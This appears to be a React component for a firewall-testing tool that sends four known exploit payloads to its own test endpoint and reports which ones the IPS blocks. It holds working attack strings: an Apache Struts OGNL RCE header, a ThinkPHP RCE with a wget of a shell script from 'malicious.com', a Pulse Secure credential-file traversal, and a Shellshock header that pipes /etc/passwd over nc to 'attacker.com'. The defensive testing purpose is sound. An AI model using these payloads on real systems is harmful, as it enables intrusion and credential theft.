'use client';

import { useState, useEffect, useRef } from 'react';
import { TargetIcon, PlayIcon, CheckCircleIcon, ShieldAlertIcon, TrashIcon, PulseIcon, LockIcon, UploadIcon, PlayOutlineIcon } from '@/components/Icons';
import { generateMITREReport, type MITREStageResult } from '@/lib/reportGenerator';

type TestResult = 'idle' | 'running' | 'blocked' | 'allowed' | 'error';
// eslint-disable-next-line @typescript-eslint/no-unused-vars
interface LogLike { timestamp: string; type: string; message: string; }

export default function MITREClient() {
    const [result, setResult] = useState<TestResult>('idle');
    const [logs, setLogs] = useState<{ timestamp: string; type: string; message: string; }[]>([]);
    const [stageResults, setStageResults] = useState<MITREStageResult[]>([]);
    const [ipData, setIpData] = useState<{ ip: string; country: string } | null>(null);

    useEffect(() => {
        fetch('/api/my-ip').then(r => r.json()).then(d => setIpData(d)).catch(() => {});
    }, []);

    const handleGenerateReport = async () => {
        const pdfBytes = await generateMITREReport(stageResults, ipData || undefined);
        const blob = new Blob([new Uint8Array(pdfBytes)], { type: 'application/pdf' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `MITRE-ATT&CK-Report-${new Date().toISOString().slice(0, 10)}.pdf`;
        a.click();
        URL.revokeObjectURL(url);
    };

    const addLog = (type: string, message: string) => {
        const now = new Date().toISOString().split('T')[1].slice(0, 8);
        setLogs(prev => [...prev.slice(-14), { timestamp: now, type, message }]);
    };

    const runSimulation = async (url: string, description: string, mitreId: string, options: RequestInit = {}) => {
        setResult('running');
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 4000);

            addLog('MITRE', `Executing ${mitreId}: ${description}...`);

            const fetchOpts: RequestInit = {
                ...options,
                headers: {
                    ...options.headers,
                    'Connection': 'close',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache'
                },
                cache: 'no-store',
                signal: controller.signal
            };

            const res = await fetch(url, fetchOpts);
            clearTimeout(timeoutId);

            if (res.status === 403 || res.status === 503) {
                addLog('Result', `Success - Blocked by firewall (HTTP ${res.status}): ${description}`);
                return 'blocked';
            }

            // Critical: read the full response body.
            // NGFW may terminate the connection mid-stream AFTER headers are sent.
            // If the body read fails, the NGFW killed the connection = blocked.
            try {
                await res.arrayBuffer();
            } catch {
                addLog('Result', `Success - Connection terminated mid-stream: ${description}`);
                return 'blocked';
            }

            if (res.type === 'opaque' || res.status === 0) {
                addLog('Result', `Vulnerable - Payload reached destination (Opaque response): ${description}`);
                return 'allowed';
            } else if (res.ok || res.status === 404 || res.status === 405) {
                addLog('Result', `Vulnerable - Payload reached destination (HTTP ${res.status}): ${description}`);
                return 'allowed';
            } else {
                addLog('Result', `Error - Unexpected status ${res.status}: ${description}`);
                return 'error';
            }
        } catch (e) {
            addLog('Result', `Success - Connection dropped/timeout: ${description}`);
            return 'blocked';
        }
    };

    const handleMitre = async () => {
        setLogs([]);
        // Cache-bust all URLs to prevent CDN/browser caching
        const cacheBust = '_t=' + Date.now();

        const tests = [
            // T1190 - Exploit Public-Facing Application -> Apache Struts (CVE-2017-5638)
            // 1st Class Accuracy Exploit: High Severity, highly reliable signature in all IPS engines.
            {
                url: '/api/ngfw/test?' + cacheBust,
                options: { 
                    method: 'GET',
                    headers: { 
                        'Content-Type': '%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd=\'id\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}' 
                    }
                },
                desc: 'Exploit Public-Facing Application (Apache Struts RCE)',
                mitreId: 'T1190'
            },
            // T1059.004 - Command and Scripting Interpreter -> ThinkPHP RCE (CVE-2018-20062)
            // 1st Class Accuracy Exploit: Network-based Command Execution payload.
            {
                url: '/api/ngfw/test?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget%20http://malicious.com/shell.sh&' + cacheBust,
                options: { method: 'GET' },
                desc: 'Command & Scripting Interpreter (ThinkPHP RCE)',
                mitreId: 'T1059.004'
            },
            // T1003.001 - OS Credential Dumping -> Pulse Secure VPN Arbitrary File Reading (CVE-2019-11510)
            // 1st Class Accuracy Exploit: Targets the cached cleartext password realm database.
            // Note: Browsers mandate URL path normalization (resolving ../ locally). To force the 
            // literal '../' traversal onto the wire for the IPS to catch, we append it to the query string.
            {
                url: '/api/ngfw/test?vuln=/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb&' + cacheBust,
                options: { method: 'GET' },
                desc: 'OS Credential Dumping (Pulse Secure VPN Creds Leak)',
                mitreId: 'T1003.001'
            },
            // T1048.003 - Exfiltration -> Command Injection (Shellshock CVE-2014-6271)
            // 1st Class Accuracy IPS: Exfiltrating system data via Shellshock environment variable injection.
            // Universally blocked by all NGFW IPS engines (does not rely on optional DLP features).
            {
                url: '/api/ngfw/test?' + cacheBust,
                options: { 
                    method: 'GET',
                    headers: { 'User-Agent': '() { :;}; /bin/bash -c "cat /etc/passwd | nc attacker.com 4444"' }
                },
                desc: 'Exfiltration Over Unencrypted Protocol (Shellshock)',
                mitreId: 'T1048.003'
            }
        ];

        let blockedCount = 0;
        const stageData: MITREStageResult[] = [];
        for (let i = 0; i < tests.length; i++) {
            const test = tests[i];
            const result = await runSimulation(test.url, test.desc, test.mitreId, test.options as RequestInit);
            if (result === 'blocked') blockedCount++;
            stageData.push({
                stage: i + 1,
                name: test.desc.split('(')[0].trim(),
                technique: test.desc,
                techniqueId: test.mitreId,
                result: result === 'blocked' ? 'blocked' : 'passed',
                detail: result === 'blocked' ? 'Payload blocked by firewall IPS' : 'Payload reached destination',
            });

            if (i < tests.length - 1) {
                await new Promise(r => setTimeout(r, 6000));
            }
        }
        setStageResults(stageData);

        addLog('INFO', `SUMMARY: ${blockedCount}/${tests.length} stages blocked successfully.`);
        setResult(blockedCount === tests.length ? 'blocked' : 'error');
    };

    return (
        <div>
            <header style={{ marginBottom: '2rem' }}>
                <h1 style={{ fontSize: '1.8rem', color: '#0F172A', marginBottom: '0.2rem' }}>MITRE ATT&CK Simulator</h1>
                <p style={{ margin: 0, fontSize: '0.95rem', color: '#64748B' }}>
                    Validate your security controls against a sequential adversary Kill Chain.
                </p>
            </header>

            <div className="layout-ngfw" style={{ gridTemplateColumns: '1fr', maxWidth: '1000px', margin: '0 auto' }}>
                <div className="card" style={{ marginBottom: '2rem' }}>
                    <div style={{ padding: '2rem', borderBottom: '1px solid #E2E8F0' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', marginBottom: '1.5rem' }}>
                            <div style={{ background: '#0F172A', color: '#38BDF8', padding: '1rem', borderRadius: '12px', display: 'flex', border: '1px solid #1E293B' }}>
                                <TargetIcon width={32} height={32} />
                            </div>
                            <div>
                                <h2 style={{ margin: 0, fontSize: '1.5rem', color: '#0F172A' }}>Adversary Kill Chain Execution</h2>
                                <p style={{ margin: '0.5rem 0 0 0', color: '#475569', fontSize: '1rem', lineHeight: '1.5' }}>
                                    Unlike isolated signature tests, real-world attacks happen in stages. This simulator executes four major phases of the MITRE ATT&CK framework sequentially to test if your perimeter defenses can break the kill chain before an attacker achieves their objective.
                                </p>
                            </div>
                        </div>
                        <div className="grid-stats" style={{ marginTop: '2rem', marginBottom: 0 }}>
                            <div style={{
                                border: '2px dashed #3B82F6',
                                borderRadius: '12px',
                                padding: '1.5rem',
                                background: '#EFF6FF',
                                display: 'flex',
                                flexDirection: 'column',
                                alignItems: 'center',
                                textAlign: 'center',
                                minHeight: '240px',
                                justifyContent: 'center',
                                transition: 'transform 0.2s'
                            }}>
                                <div style={{ marginBottom: '1rem', color: '#3B82F6' }}>
                                    <TargetIcon width={40} height={40} />
                                </div>
                                <h3 style={{ margin: '0 0 0.5rem 0', color: '#1E293B', fontSize: '1.1rem' }}>Initial Access</h3>
                                <div style={{ fontSize: '0.85rem', color: '#64748B', marginBottom: '0.5rem' }}>Exploit Public-Facing App (T1190)</div>
                                <p style={{ margin: 0, fontSize: '0.8rem', color: '#64748B' }}>Apache Struts HTTP Header RCE (CVE-2017-5638) malicious OGNL injection.</p>
                            </div>

                            <div style={{
                                border: '2px dashed #3B82F6',
                                borderRadius: '12px',
                                padding: '1.5rem',
                                background: '#EFF6FF',
                                display: 'flex',
                                flexDirection: 'column',
                                alignItems: 'center',
                                textAlign: 'center',
                                minHeight: '240px',
                                justifyContent: 'center',
                                transition: 'transform 0.2s'
                            }}>
                                <div style={{ marginBottom: '1rem', color: '#3B82F6' }}>
                                    <PulseIcon width={40} height={40} />
                                </div>
                                <h3 style={{ margin: '0 0 0.5rem 0', color: '#1E293B', fontSize: '1.1rem' }}>Execution</h3>
                                <div style={{ fontSize: '0.85rem', color: '#64748B', marginBottom: '0.5rem' }}>Unix Shell (T1059.004)</div>
                                <p style={{ margin: 0, fontSize: '0.8rem', color: '#64748B' }}>ThinkPHP RCE (CVE-2018-20062) outbound reverse shell attempt.</p>
                            </div>

                            <div style={{
                                border: '2px dashed #3B82F6',
                                borderRadius: '12px',
                                padding: '1.5rem',
                                background: '#EFF6FF',
                                display: 'flex',
                                flexDirection: 'column',
                                alignItems: 'center',
                                textAlign: 'center',
                                minHeight: '240px',
                                justifyContent: 'center',
                                transition: 'transform 0.2s'
                            }}>
                                <div style={{ marginBottom: '1rem', color: '#3B82F6' }}>
                                    <LockIcon width={40} height={40} />
                                </div>
                                <h3 style={{ margin: '0 0 0.5rem 0', color: '#1E293B', fontSize: '1.1rem' }}>Credential Access</h3>
                                <div style={{ fontSize: '0.85rem', color: '#64748B', marginBottom: '0.5rem' }}>OS Credential Dumping (T1003.001)</div>
                                <p style={{ margin: 0, fontSize: '0.8rem', color: '#64748B' }}>Pulse Secure VPN (CVE-2019-11510) accessing cached cleartext passwords DB.</p>
                            </div>

                            <div style={{
                                border: '2px dashed #3B82F6',
                                borderRadius: '12px',
                                padding: '1.5rem',
                                background: '#EFF6FF',
                                display: 'flex',
                                flexDirection: 'column',
                                alignItems: 'center',
                                textAlign: 'center',
                                minHeight: '240px',
                                justifyContent: 'center',
                                transition: 'transform 0.2s'
                            }}>
                                <div style={{ marginBottom: '1rem', color: '#3B82F6' }}>
                                    <UploadIcon width={40} height={40} />
                                </div>
                                <h3 style={{ margin: '0 0 0.5rem 0', color: '#1E293B', fontSize: '1.1rem' }}>Exfiltration</h3>
                                <div style={{ fontSize: '0.85rem', color: '#64748B', marginBottom: '0.5rem' }}>Unencrypted Protocol (T1048.003)</div>
                                <p style={{ margin: 0, fontSize: '0.8rem', color: '#64748B' }}>Shellshock (CVE-2014-6271) payload exfiltrating system files over netcat.</p>
                            </div>
                        </div>
                    </div>

                    <div style={{ padding: '2rem', display: 'flex', justifyContent: 'center' }}>
                        <button
                            className="btn-outline"
                            onClick={handleMitre}
                            disabled={result === 'running'}
                            style={{ padding: '0.75rem 1.5rem', fontSize: '1rem' }}
                        >
                            {result === 'running' ? (
                                <div className="spinner" style={{ width: '18px', height: '18px', border: '2px solid #CBD5E1', borderTopColor: '#334155', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>
                            ) : (
                                <PlayOutlineIcon width={20} height={20} />
                            )}
                            {result === 'running' ? 'Executing Kill Chain...' : 'Execute Kill Chain'}
                        </button>
                    </div>
                </div>

                <div style={{
                    background: '#0F172A',
                    borderRadius: '12px',
                    padding: '1.5rem',
                    color: '#38BDF8',
                    fontFamily: 'monospace',
                    fontSize: '0.9rem',
                    height: '400px',
                    display: 'flex',
                    flexDirection: 'column',
                    boxShadow: 'inset 0 2px 10px rgba(0,0,0,0.5)'
                }}>
                    <div style={{ borderBottom: '1px solid #334155', paddingBottom: '0.5rem', marginBottom: '1rem', color: '#F8FAFC', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <span style={{ fontWeight: 600 }}>&gt;__ ATT&CK Simulation Output</span>
                        <button
                            onClick={() => setLogs([])}
                            onMouseEnter={(e) => (e.currentTarget.style.color = '#FFFFFF')}
                            onMouseLeave={(e) => (e.currentTarget.style.color = '#E2E8F0')}
                            style={{
                                background: 'transparent',
                                border: 'none',
                                color: '#E2E8F0',
                                cursor: 'pointer',
                                padding: '4px',
                                display: 'flex',
                                alignItems: 'center',
                                gap: '4px',
                                fontSize: '0.8rem',
                                transition: 'color 0.2s',
                                fontWeight: 500
                            }}
                            title="Clear Console"
                        >
                            <TrashIcon width={16} height={16} /> <span style={{ textDecoration: 'underline', textUnderlineOffset: '2px' }}>Clear</span>
                        </button>
                    </div>
                    <div style={{ flex: 1, overflowY: 'auto' }}>
                        {logs.length === 0 ? (
                            <span style={{ opacity: 0.5, fontStyle: 'italic' }}>Waiting for test execution...</span>
                        ) : (
                            logs.map((log, i) => (
                                <div key={i} style={{ marginBottom: '0.5rem' }}>
                                    <span style={{ color: '#64748B', marginRight: '0.5rem' }}>[{log.timestamp}]</span>
                                    {log.type !== 'INFO' && (
                                        <span style={{
                                            color: log.type === 'Result' && log.message.includes('Success') ? '#4ADE80' :
                                                log.type === 'Result' && log.message.includes('Error') ? '#F87171' :
                                                    log.type === 'Result' && log.message.includes('Vulnerable') ? '#FCD34D' : '#38BDF8',
                                            fontWeight: 'bold',
                                            marginRight: '0.5rem'
                                        }}>{log.type}:</span>
                                    )}
                                    <span style={{ color: '#E2E8F0', fontWeight: log.type === 'INFO' ? 'bold' : 'normal' }}>
                                        {log.message}
                                    </span>
                                </div>
                            ))
                        )}
                        <div style={{ marginTop: '0.5rem', borderLeft: '2px solid #38BDF8', height: '1rem', animation: 'blink 1s infinite' }}></div>
                    </div>
                </div>
            </div>

            {/* Floating Report Bar */}
            {stageResults.length > 0 && (
                <div style={{
                    position: 'fixed', bottom: 0, left: 72, right: 0,
                    background: 'rgba(15, 23, 42, 0.95)', backdropFilter: 'blur(8px)',
                    padding: '0.75rem 2rem', display: 'flex', alignItems: 'center', gap: '1rem',
                    zIndex: 100, borderTop: '1px solid rgba(255,255,255,0.1)',
                }}>
                    <span style={{ color: '#94A3B8', fontSize: '0.9rem', display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                        {stageResults.length} stages completed
                    </span>
                    <span style={{ color: '#10B981', fontSize: '0.85rem' }}>
                        {stageResults.filter(s => s.result === 'blocked').length} blocked
                    </span>
                    <span style={{ color: '#EF4444', fontSize: '0.85rem' }}>
                        {stageResults.filter(s => s.result === 'passed').length} passed
                    </span>
                    <div style={{ marginLeft: 'auto', display: 'flex', gap: '0.75rem' }}>
                        <button
                            onClick={() => setStageResults([])}
                            style={{
                                background: 'transparent', border: '1px solid #475569', color: '#94A3B8',
                                padding: '0.5rem 1rem', borderRadius: '6px', cursor: 'pointer', fontSize: '0.85rem',
                            }}
                        >
                            Clear Results
                        </button>
                        <button
                            onClick={handleGenerateReport}
                            style={{
                                background: '#2563EB', border: 'none', color: 'white',
                                padding: '0.5rem 1.25rem', borderRadius: '6px', cursor: 'pointer',
                                fontSize: '0.85rem', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '0.5rem',
                            }}
                        >
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                            Generate Report
                        </button>
                    </div>
                </div>
            )}
        </div>
    );
}
